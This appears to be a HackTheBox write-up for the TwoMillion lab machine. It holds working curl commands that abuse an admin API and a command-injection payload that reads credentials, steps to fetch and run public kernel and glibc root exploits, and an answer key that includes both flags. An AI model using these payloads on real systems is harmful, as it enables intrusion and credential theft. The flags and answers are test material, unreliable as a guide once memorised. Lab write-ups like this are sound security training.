---
layout: default
title: TwoMillion
page_type: writeup
---

# TwoMillion - HackTheBox



## Machine Information

| Attribute | Value |
| --- | --- |
| Machine Name | TwoMillion |
| IP Address | 10.10.11.221 |
| Difficulty | Easy |
| Operating System | Linux (Ubuntu) |
| Release Date | June 2023 |

***

## Executive Summary

TwoMillion is an Easy-rated Linux machine on HackTheBox that features a nostalgic recreation of the original HTB platform. The machine requires:

- Web application reconnaissance to discover an invite code generation mechanism
- API enumeration to identify administrative endpoints
- Privilege escalation through command injection in an API endpoint
- Exploitation of a kernel vulnerability (CVE-2023-0386) to obtain root access

This machine provides excellent practice in API security testing, command injection exploitation, and Linux kernel privilege escalation techniques.

***

## Reconnaissance

### Port Scanning

Initial reconnaissance was performed using RustScan for rapid port discovery, followed by detailed Nmap service enumeration:

```javascript
rustscan -a 10.10.11.221 -- -A
```

**Results:**

```javascript
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    syn-ack nginx
|_http-title: Did not follow redirect to http://2million.htb/
```

**Key Findings:**

- Two open TCP ports identified
- SSH service running OpenSSH 8.9p1 (Ubuntu)
- HTTP service redirecting to `2million.htb` hostname
- Nginx web server detected

### DNS Configuration

Added the hostname to `/etc/hosts` for proper resolution:

```javascript
echo "10.10.11.221 2million.htb" | sudo tee -a /etc/hosts
```

***

## Web Application Analysis

### Initial Access Page

Navigating to `http://2million.htb` revealed a recreation of the original HackTheBox platform interface. The site featured:

- A login/registration system
- An "Invite" section requiring an invite code
- Multiple navigation links (most non-functional)
- A nostalgic design reminiscent of the original HTB

### JavaScript Reconnaissance

Inspecting the `/invite` page using browser Developer Tools (Network tab) revealed a JavaScript file: **`inviteapi.min.js`**

**Obfuscated JavaScript Code:**

```javascript
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

**Deobfuscated Code:**

Using an online JavaScript unpacker, the code revealed two important functions:

```javascript
function verifyInviteCode(code) {
    var formData = {"code":code};
    $.ajax({
        type:"POST",
        dataType:"json",
        data:formData,
        url:'/api/v1/invite/verify',
        success:function(response) {
            console.log(response)
        },
        error:function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type:"POST",
        dataType:"json",
        url:'/api/v1/invite/generate',
        success:function(response) {
            console.log(response)
        },
        error:function(response) {
            console.log(response)
        }
    })
}
```

**Key Discovery:** The `makeInviteCode()` function makes a POST request to `/api/v1/invite/generate`

***

## Initial Foothold

### Generating an Invite Code

Making a curl request to the discovered endpoint:

```javascript
curl -X POST http://2million.htb/api/v1/invite/generate
```

**Response:**

```javascript
{
    "0":200,
    "success":1,
    "data":{
        "code":"RUtVQkgtSUlNVE8tSzVFN0ktSU5LVTA=",
        "format":"encoded"
    }
}
```

**Decoding the Invite Code:**

The code is Base64-encoded. Decoding it:

```javascript
echo "RUtVQkgtSUlNVE8tSzVFN0ktSU5LVTA=" | base64 -d
```

**Result:** `EKUBH-IIMTO-K5E7I-INKU0`

### User Registration

Using the decoded invite code, I successfully registered an account on the platform:

- Username: `lorsupra`
- Email: `[email protected]`
- Password: `Password123!`

***

## API Enumeration

### Discovering API Endpoints

After authentication, I explored the "Access" page which revealed that clicking "Connection Pack" triggers a request to:

```javascript
/api/v1/user/vpn/generate
```

To enumerate additional API endpoints, I accessed the API documentation at:

```javascript
http://2million.htb/api/v1
```

**Complete API Structure:**

```javascript
{
   "v1":{
      "user":{
         "GET":{
            "/api/v1":"Route List",
            "/api/v1/invite/how/to/generate":"Instructions on invite code generation",
            "/api/v1/invite/generate":"Generate invite code",
            "/api/v1/invite/verify":"Verify invite code",
            "/api/v1/user/auth":"Check if user is authenticated",
            "/api/v1/user/vpn/generate":"Generate a new VPN configuration",
            "/api/v1/user/vpn/regenerate":"Regenerate VPN configuration",
            "/api/v1/user/vpn/download":"Download OVPN file"
         },
         "POST":{
            "/api/v1/user/register":"Register a new user",
            "/api/v1/user/login":"Login with existing user"
         }
      },
      "admin":{
         "GET":{
            "/api/v1/admin/auth":"Check if user is admin"
         },
         "POST":{
            "/api/v1/admin/vpn/generate":"Generate VPN for specific user"
         },
         "PUT":{
            "/api/v1/admin/settings/update":"Update user settings"
         }
      }
   }
}
```

**Key Findings:**

- Three admin endpoints discovered under `/api/v1/admin`
- The `/api/v1/admin/settings/update` endpoint appears to modify user settings
- Admin privilege escalation vector identified

### Privilege Escalation to Admin

The `/api/v1/admin/settings/update` endpoint accepts a PUT request to update user settings. Testing for privilege escalation:

```javascript
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
    --cookie "PHPSESSID=8j7750d6utrib4b8fpva463c00" \
    --header "Content-Type: application/json" \
    -d '{"email":"[email protected]","is_admin":1}'
```

**Result:** Successfully elevated the account to administrator privileges.

***

## Command Injection Exploitation

### Identifying the Vulnerability

The `/api/v1/admin/vpn/generate` endpoint was identified as vulnerable to command injection. Testing with a payload to read the `.env` file:

```javascript
curl -X POST http://2million.htb/api/v1/admin/vpn/generate \
    --cookie "PHPSESSID=8j7750d6utrib4b8fpva463c00" \
    -H "Content-Type: application/json" \
    -d '{"username":"lorsupra; cat /var/www/html/.env;"}'
```

**Response (Database Credentials):**

```javascript
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

### SSH Access

Using the discovered database password to attempt SSH authentication:

```javascript
ssh admin@2million.htb
Password: SuperDuperPass123
```

**Success!** Gained shell access as the `admin` user.

***

## User Flag

Retrieved the user flag from the admin home directory:

```javascript
admin@2million:~$ cat user.txt
5060cbb06dd171680f4fd2ec6e867869
```

***

## Privilege Escalation to Root

### Email Discovery

Checking for system mail in `/var/mail/admin`:

```javascript
admin@2million:/var/mail$ cat admin
```

**Email Content:**

```javascript
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While 
we're partially down, can you also upgrade the OS on our web host? There 
have been a few serious Linux kernel CVEs already this year. That one in 
OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

**Key Intelligence:** The email mentions a serious Linux kernel CVE related to OverlayFS/FUSE.

### CVE Research

Researching 2023 Linux kernel vulnerabilities related to OverlayFS identified:

**CVE-2023-0386** - OverlayFS Privilege Escalation

This vulnerability allows an attacker to move files in the Overlay file system while maintaining metadata like owner and SetUID bits, leading to privilege escalation.

### Exploitation

**Step 1: Transfer Exploit**

Downloaded the CVE-2023-0386 exploit and transferred it to the target:

```javascript
sshpass -p SuperDuperPass123 scp CVE-2023-0386-main.zip admin@2million.htb:/tmp/
```

**Step 2: Prepare Exploit**

On the target machine:

```javascript
cd /tmp
unzip CVE-2023-0386-main.zip
cd CVE-2023-0386-main
```

**Step 3: Execute Exploit**

Following the POC README instructions:

```javascript
make all
./fuse ./ovlcap/lower ./gc
```

In another terminal session:

```javascript
./exp
```

**Result:** Successfully obtained root privileges!

***

## Root Flag

Retrieved the root flag:

```javascript
root@2million:/root# cat root.txt
c7e63ec5102c658cf6f2d5864aee7377
```

***

## Alternative Privilege Escalation - Looney Tunables

### CVE-2023-4911 Analysis

An alternative privilege escalation path exists via **CVE-2023-4911** (Looney Tunables), a buffer overflow vulnerability in the GNU C dynamic loader.

**System Information:**

```javascript
admin@2million:~$ ldd --version
ldd (Ubuntu GLIBC 2.35-0ubuntu3.1) 2.35
```

The system is running **GLIBC 2.35**, which is vulnerable to CVE-2023-4911.

### Exploitation

The vulnerability is triggered through the `GLIBC_TUNABLES` environment variable, which causes a buffer overflow in the dynamic loader.

**POC Execution:**

```javascript
# Download and compile exploit
wget https://github.com/leesh3288/CVE-2023-4911/archive/main.zip
unzip main.zip
cd CVE-2023-4911-main
make

# Execute exploit
./exploit
```

**Result:** Alternative root shell obtained via GLIBC buffer overflow.

***

## Lessons Learned

### Security Takeaways

1. **API Security**
    - Always implement proper authorization checks on admin endpoints
    - The `is_admin` parameter should never be user-controllable
    - API documentation exposure can reveal attack vectors
2. **Command Injection**
    - User input should always be sanitized before being used in system commands
    - Implement input validation and use parameterized functions
    - The VPN generation endpoint should use secure subprocess handling
3. **Credential Management**
    - Database credentials stored in `.env` files should have restricted permissions
    - Password reuse between database and system accounts creates unnecessary risk
    - Implement proper secrets management solutions
4. **Patch Management**
    - The email about kernel CVEs was prescient - both exploited CVEs were from 2023
    - Regular patching is critical for Linux kernel security
    - OverlayFS and GLIBC vulnerabilities are particularly dangerous

### Attack Chain Summary

```javascript
Web Enumeration → API Discovery → Invite Code Generation → 
Registration → Admin Privilege Escalation → Command Injection → 
SSH Access → CVE Exploitation → Root Access
```

***

## Appendix: HackTheBox Challenge Questions

### Question 1

**How many TCP ports are open?**

```javascript
2
```

### Question 2

**What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?**

```javascript
inviteapi.min.js
```

### Question 3

**What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.**

```javascript
makeInviteCode
```

### Question 4

**The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?**

```javascript
base64
```

### Question 5

**What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?**

```javascript
/api/v1/user/vpn/generate

```

### Question 6

**How many API endpoints are there under /api/v1/admin?**

```javascript
3
```

### Question 7

**What API endpoint can change a user account to an admin account?**

```javascript
/api/v1/admin/settings/update

```

### Question 8

**What API endpoint has a command injection vulnerability in it?**

```javascript
/api/v1/admin/vpn/generate
```

### Question 9

**What file is commonly used in PHP applications to store environment variable values?**

```javascript
.env
```

### Question 10

**Submit the flag located in the admin user's home directory.**

```javascript
5060cbb06dd171680f4fd2ec6e867869
```

### Question 11

**What is the email address of the sender of the email sent to admin?**

```javascript
ch4p@2million.htb
```

### Question 12

**What is the 2023 CVE ID for a vulnerability that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?**

```javascript
CVE-2023-0386
```

### Question 13

**Submit the flag located in root's home directory.**

```javascript
c7e63ec5102c658cf6f2d5864aee7377
```

### Question 14 (Alternative Priv Esc)

**What is the version of the GLIBC library on TwoMillion?**

```javascript
2.35
```

### Question 15 (Alternative Priv Esc)

**What is the CVE ID for the 2023 buffer overflow vulnerability in the GNU C dynamic loader?**

```javascript
CVE-2023-4911
```

### Question 16 (Alternative Priv Esc)

**With a shell as admin or www-data, find a POC for Looney Tunables. What is the name of the environment variable that triggers the buffer overflow?**

```javascript
GLIBC_TUNABLES
```

***

## Tools Used

- RustScan - Fast port scanning
- Nmap - Service enumeration
- curl - API interaction and testing
- Browser Developer Tools - JavaScript analysis
- JavaScript Unpacker - Deobfuscation
- base64 - Decoding
- sshpass - Automated SSH file transfer
- CVE-2023-0386 exploit - OverlayFS privilege escalation
- CVE-2023-4911 exploit - GLIBC buffer overflow

***

## References

- [CVE-2023-0386 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-0386)
- [CVE-2023-4911 Details](https://nvd.nist.gov/vuln/detail/CVE-2023-4911)
- [OverlayFS Documentation](https://www.kernel.org/doc/Documentation/filesystems/overlayfs.txt)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
